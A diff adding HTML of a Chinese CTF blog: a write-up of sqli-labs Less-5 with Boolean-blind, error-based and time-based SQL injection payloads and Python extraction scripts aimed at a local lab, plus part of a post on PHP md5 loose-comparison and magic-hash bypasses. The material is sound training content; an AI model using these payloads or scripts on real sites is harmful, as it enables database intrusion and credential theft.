@@ -165,6 +165,300 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/" class="post-title-link" itemprop="url">细说sqli_labs Less-5</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-26 10:22:23" itemprop="dateCreated datePublished" datetime="2021-02-26T10:22:23+08:00">2021-02-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-21 16:53:57" itemprop="dateModified" datetime="2021-03-21T16:53:57+08:00">2021-03-21</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。</p>
+<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>用sqlmap判断注入类型，可以看到这道题有三种解题方法，分别是布尔盲注，报错注入，以及延时注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/1.png"></p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/2.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/3.png"></p>
+<p>通过报错<code>&quot;1&quot;LIMIT 0,1&#39;</code>，可以推出我们输入的内容构成的查询语句为<code>&#39;1&quot;LIMIT 0,1</code>，可以看出id是用一对单引号闭合的，我们输入1‘导致报错。</p>
+<h3 id="绕过报错"><a href="#绕过报错" class="headerlink" title="绕过报错"></a>绕过报错</h3><p>我们输入一个单引号与后面的一个单引号结合导致报错，猜想如果我们把后面的单引号注释掉就可以绕过报错。</p>
+<p>查看mysql写注释的方法，有三种</p>
+<ul>
+<li>#</li>
+<li>–+(–空格)</li>
+<li>/**/    适用于多行注释</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag;#select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; </span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;-- select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;&#x2F;*select database();*&#x2F;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; select * from flag;&#x2F;*select database();*&#x2F;;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/4.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/5.png"></p>
+<p>我们可以看到使用–空格可以绕过报错，而使用#不能绕过报错。我们打开burpsuit分析，可以发现#显示黑色，也就是说#没有成功进入url访问，导致无法绕过。但用#的url编码%23可以绕过。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/6.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/7.png"></p>
+<h3 id="BurpSuite爆破"><a href="#BurpSuite爆破" class="headerlink" title="BurpSuite爆破"></a>BurpSuite爆破</h3><p>当我们输入的语句正确且我们判断正确时，会返回<code>You are in ...</code>的界面，当我们输入的语句正确且判断语句错误时会返回空白。据此，我们可以通过返回的页面来查看我们的判断语句是否正确。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/8.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/9.png"></p>
+<p>这里先介绍几个函数的用法</p>
+<p>substr()函数返回字符串的一小部分，substr(string,start,length)（length为1，即从第一个字母开始）</p>
+<p>limit的使用格式为limitm,n，其中m是指记录开始的位置，n是指取几条记录。（第一条记录是从0开始）</p>
+<p>ascii(str): str是一个字符串参数，返回值字符串的ascii码。</p>
+<p>timeout：设定超时时间，秒为单位,在设定时间内没有返回内容则返回一个timeout异常</p>
+<p>下面开始进行爆破，爆破的顺序是数据库名，表名，字段名，字段值。</p>
+<p>爆破数据库的第一个字符，返回空白，即第一个字符不是a。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/10.png"></p>
+<p>可以使用burpsuit的intruder模块对字符a进行爆破。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/11.png"></p>
+<p>从这个例子可以看到，数据库的第一个字母为s，且mysql对字母大小写不敏感。但使用这种方法速度较低，我们可以直接爆破整个数据库名。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/12.png"></p>
+<p>第一个爆破的数字为数字，设置为1到10；第二个爆破的数字为字符，字典为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&amp;*()-&#x3D;_;&#39;,.&#39;&lt;&gt;?&#96;~\|&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/13.png"></p>
+<p>通过爆破我们可以简单看出，数据库名为secrity</p>
+<p>使用这个方法较为简单，但是所花的时间相对较长，在ctf比赛中，该方法并不是为最优的，下面介绍使用脚本破解。</p>
+<h3 id="简单脚本"><a href="#简单脚本" class="headerlink" title="简单脚本"></a>简单脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$Z%^&amp;*()\][;&#x27;.,/`·-=&#x27;]&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(database(),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    		r=requests.get(url)</span><br><span class="line">    		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">  <span class="comment">#database()=security</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破表名的url为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个表名 admin</span></span><br><span class="line"><span class="comment">#第二个表名 emails</span></span><br><span class="line"><span class="comment">#第三个表名 student</span></span><br><span class="line"><span class="comment">#第四个表名 uagents</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破字段名的url</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1),%d,1)=&#x27;%s&#x27;--+&quot;%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#admin 有三个字段名 id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破字段值的url</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select id from admin limit 0,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br></pre></td></tr></table></figure>
+
+<p>完整脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    		r=requests.get(url)</span><br><span class="line">    		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="二分法脚本"><a href="#二分法脚本" class="headerlink" title="二分法脚本"></a>二分法脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#for j in range(1,10):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">				url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&lt;=&#x27;%s&#x27;--+&quot;</span>%(i,mid)</span><br><span class="line">				r=requests.get(url)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					high = mid</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					low = mid+<span class="number">1</span></span><br><span class="line">				mid = (low + high) // <span class="number">2</span></span><br><span class="line">	s += chr(int(mid))</span><br><span class="line">	print(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>SQL报错注入就是利用数据库的某些查询报错的机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<p>这里我们使用floor报错来解题。（floor报错原理这里不再叙述）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#爆数据库</span></span><br><span class="line">pay=<span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1%27%20and id=1 and (select 1 from (select count(*),concat(&quot;</span>+pay+<span class="string">&quot;,floor(rand(0)*2))x from information_schema.tables group by x)a) --+;&quot;</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">print(re.findall(<span class="string">&quot;Duplicate entry &#x27;(.*?)1&#x27; for key&quot;</span>,r.text))</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>当判断错误时，1秒多就返回页面。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/14.png"></p>
+<p>当判断正确时，会休眠5秒后再返回页面，也就6秒多才返回页面。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/15.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$%^&amp;*()_+&#123;&#125;|?&gt;&lt;&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and if(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;,sleep(5),0)--+&quot;</span>%(j,i)</span><br><span class="line">    </span><br><span class="line">    		<span class="keyword">try</span>:</span><br><span class="line">    			r=requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">    			<span class="comment">#print(url)</span></span><br><span class="line">    		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/02/03/%E6%B5%85%E8%B0%88md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E7%A2%B0%E6%92%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/03/%E6%B5%85%E8%B0%88md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E7%A2%B0%E6%92%9E/" class="post-title-link" itemprop="url">浅析md5弱类型比较和强碰撞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-03 14:53:18" itemprop="dateCreated datePublished" datetime="2021-02-03T14:53:18+08:00">2021-02-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-21 16:51:40" itemprop="dateModified" datetime="2021-03-21T16:51:40+08:00">2021-03-21</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF中，md5的题目太常见了，虽然有很多这方面的文章，但相对来说比较零散，这里主要将自己学习和比赛时遇到的md5弱类型和强碰撞的题目从浅到深地梳理一下。</p>
+<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><p>php中有两种比较的符号==与===<br>==在进行比较的时候，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。</p>
+<p>===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/1.png"></p>
+<p>0e开头且都是数字的字符串，弱类型比较都等于0。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/2.png"></p>
+<h2 id="比较"><a href="#比较" class="headerlink" title="==比较"></a>==比较</h2><p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">&#x27;a&#x27;</span>] != $_POST[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="keyword">if</span> (md5($_POST[<span class="string">&#x27;a&#x27;</span>]) == md5($_POST[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    	<span class="keyword">else</span></span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">&#x27;you are wrong&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;请输入不同的a，b值&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>由于md5不能加密数组，在加密数组的时候会返回NULL</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/3.png"></p>
+<p>所以，我们可以传入两个数组</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/4.png"></p>
+<h3 id="解放2"><a href="#解放2" class="headerlink" title="解放2"></a>解放2</h3><p>可以传入两个md5加密后是0e开头的字符串，需要注意的地方是，这个以0e开头的字符串只能是纯数字，这样php在进行科学计算法的时候才会将它转化为0。可以查找以0e开头md5加密相等的字符串，也可以自己编写代码，提供以下脚本。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($a=<span class="number">1</span>;$a&lt;=<span class="number">1000000000</span>;$a++)&#123;</span><br><span class="line">   $md5 = md5($a);</span><br><span class="line">   <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^0e\d+$/&#x27;</span>,$md5))&#123;</span><br><span class="line">      <span class="keyword">echo</span> $a;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">echo</span> $md5;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/5.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/md5/6.png"></p>
